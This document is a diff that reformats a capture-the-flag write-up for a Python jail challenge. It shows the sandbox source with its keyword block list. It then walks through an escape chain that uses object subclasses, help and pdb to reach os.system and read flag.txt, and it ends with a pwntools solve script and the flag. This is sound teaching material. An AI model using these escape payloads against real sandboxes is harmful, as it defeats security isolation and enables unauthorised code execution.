@@ -17,30 +17,48 @@ Flag is in `flag.txt`.
 
 `sandbox.py`:
 
-```python def check_pattern(user_input): """ This function will check if
-numbers or strings are in user_input. """ return '"' in user_input or '\'' in
-user_input or any(str(n) in user_input for n in range(10))
+```python
+def check_pattern(user_input):
+    """
+    This function will check if numbers or strings are in user_input.
+    """
+    return '"' in user_input or '\'' in user_input or any(str(n) in user_input for n in range(10))
 
 
-while True: user_input = input(">> ")
+while True:
+    user_input = input(">> ")
 
-    if len(user_input) == 0: continue
+    if len(user_input) == 0:
+        continue
 
-    if len(user_input) > 500: print("Too long!") continue
+    if len(user_input) > 500:
+        print("Too long!")
+        continue
 
-    if not __import__("re").fullmatch(r'([^()]|\(\))*', user_input): print("No
-    function calls with arguments!") continue
+    if not __import__("re").fullmatch(r'([^()]|\(\))*', user_input):
+        print("No function calls with arguments!")
+        continue
 
-    if check_pattern(user_input): print("Numbers and strings are forbbiden")
-    continue
+    if check_pattern(user_input):
+       print("Numbers and strings are forbbiden")
+       continue
 
-    forbidden_keywords = ['eval', 'exec', 'import', 'open'] forbbiden = False
-    for word in forbidden_keywords: if word in user_input: forbbiden = True
+    forbidden_keywords = ['eval', 'exec', 'import', 'open']
+    forbbiden = False
+    for word in forbidden_keywords:
+        if word in user_input:
+            forbbiden = True
 
-    if forbbiden: print("Forbbiden keyword") continue
+    if forbbiden:
+        print("Forbbiden keyword")
+        continue
 
-    try: output = eval(user_input, {"__builtins__": None}, {}) print(output)
-    except: print("Error") ```
+    try:
+        output = eval(user_input, {"__builtins__": None}, {})
+        print(output)
+    except:
+        print("Error")
+```
 
 ## Solution
 
@@ -60,10 +78,8 @@ There are a few restrictions. Going from top to bottom:
 
 This is a tough jail, but we can beat it little by little.
 
-Reading online, I found [this jail escape
-collection](https://shirajuki.js.org/blog/pyjail-cheatsheet/#seccon-ctf-13-1linepyjail)
-which referenced [a SECCON 13
-jail](https://github.com/SECCON/SECCON13_online_CTF/blob/main/jail/1linepyjail/solver/exploit.py).
+Reading online, I found [this jail escape collection](https://shirajuki.js.org/blog/pyjail-cheatsheet/#seccon-ctf-13-1linepyjail)
+which referenced [a SECCON 13 jail](https://github.com/SECCON/SECCON13_online_CTF/blob/main/jail/1linepyjail/solver/exploit.py).
 
 In the solution, they used the `help` built-in to import `pdb`, Python's
 debugger, which can be activated using `pdb.set_trace()`. From there, we are
@@ -80,8 +96,8 @@ the 500 character limit, which restricts the numbers we can use, but it turns
 out that none of the lines we send are remotely close to 500.
 
 The other issue is that order of operations can make certain numbers a pain to
-get to, since we can't use parenthesis to group operations. We can, however,
-use arrays and indexing with `False`, like `[True+True][False]*True`.
+get to, since we can't use parenthesis to group operations. We can, however, use
+arrays and indexing with `False`, like `[True+True][False]*True`.
 
 ### Indexing into dictionaries
 
@@ -107,26 +123,28 @@ can be instantiated into `help`:
 
 ```
 >> ().__class__.__base__.__subclasses__()[[True+True+True+True+True<<True+True+True+True+True][False]-True]()
-Type help() for interactive help, or help(object) for help about object. ```
+Type help() for interactive help, or help(object) for help about object.
+```
 
 Finally, we call the `help` object to enter the interactive help session:
 
 ```
 ().__class__.__base__.__subclasses__()[[True+True+True+True+True<<True+True+True+True+True][False]-True]()()
-Welcome to Python 3.12's help utility! If... ```
+Welcome to Python 3.12's help utility! If...
+```
 
 The only question is, why do we need `help`?
 
 It turns out that running `help` on a module automatically imports it into the
-process. This gets around not being able to use `import`. Therefore we can run
-`pdb` in the `help` session to import it.
+process. This gets around not being able to use `import`. Therefore we can
+run `pdb` in the `help` session to import it.
 
 How do we get back to the sandbox?
 
 We can use `quit`, but that's boring! Instead we can get the "help" for
-`sandbox`, which imports the entirety of `sandbox.py` again. Of course, since
-`sandbox.py` does not use `if __name__ == "__main__":`, it automatically reruns
-the whole sandbox again.
+`sandbox`, which imports the entirety of `sandbox.py` again. Of course,
+since `sandbox.py` does not use `if __name__ == "__main__":`, it automatically
+reruns the whole sandbox again.
 
 ### Globals and modules
 
@@ -143,35 +161,37 @@ Using the dictionary indexing primitive we discussed above, and the index 22,
 we can access `sys`:
 
 ```
->> [x for x in
->> ().__class__.__base__.__subclasses__()[-True].__init__.__globals__.values()][[True+True+True<<True+True+True][False]-True-True]
-<module 'sys' (built-in)> ```
+>> [x for x in ().__class__.__base__.__subclasses__()[-True].__init__.__globals__.values()][[True+True+True<<True+True+True][False]-True-True]
+<module 'sys' (built-in)>
+```
 
 The modules are quite long, but they are yet another dictionary that we can
 convert to a list. Afterwards, it turns out that `pdb` is the second to last
 thing we imported (`sandbox` being the last), so we can use `~True` to access
 it:
 
-`[x for x in [x for x in
-().__class__.__base__.__subclasses__()[-True].__init__.__globals__.values()][[True+True+True<<True+True+True][False]-True-True].modules.values()][~True].set_trace()`
+`[x for x in [x for x in ().__class__.__base__.__subclasses__()[-True].__init__.__globals__.values()][[True+True+True<<True+True+True][False]-True-True].modules.values()][~True].set_trace()`
 
 ### Using PDB
 
-Python's debugger is free from the sandbox, so we can call Python functions. It
-is similar to `gdb`, so we can simply use `p` to print whatever we want. 
+Python's debugger is free from the sandbox, so we can call Python functions. It is
+similar to `gdb`, so we can simply use `p` to print whatever we want. 
 
-Unfortunately, we still exist in the `eval`, so we can't just call `open`.
-We'll have to go through `()` again.
+Unfortunately, we still exist in the `eval`, so we can't just call `open`. We'll
+have to go through `()` again.
 
 ## Solve Script
 
-```python from pwn import * r = remote("0.cloud.chals.io", 33618)
+```python
+from pwn import *
+r = remote("0.cloud.chals.io", 33618)
 r.sendline(b"().__class__.__base__.__subclasses__()[[True+True+True+True+True<<True+True+True+True+True][False]-True]()()")
-r.sendline(b"pdb") r.sendline(b"sandbox") r.sendline(b"[x for x in [x for x in
-().__class__.__base__.__subclasses__()[-True].__init__.__globals__.values()][[True+True+True<<True+True+True][False]-True-True].modules.values()][~True].set_trace()")
-r.sendline(b"p
-().__class__.__bases__[False].__subclasses__()[-1].__init__.__globals__['__builtins__']['__import__']('os').system('cat
-flag.txt')") r.interactive() ```
+r.sendline(b"pdb")
+r.sendline(b"sandbox")
+r.sendline(b"[x for x in [x for x in ().__class__.__base__.__subclasses__()[-True].__init__.__globals__.values()][[True+True+True<<True+True+True][False]-True-True].modules.values()][~True].set_trace()")
+r.sendline(b"p ().__class__.__bases__[False].__subclasses__()[-1].__init__.__globals__['__builtins__']['__import__']('os').system('cat flag.txt')")
+r.interactive()
+```
 
 Flag: `FortID{Wh3n_7h3_517u4710n_l00k5_1mp0551bl3,_y0u_d0n7_g1v3_up}`
 
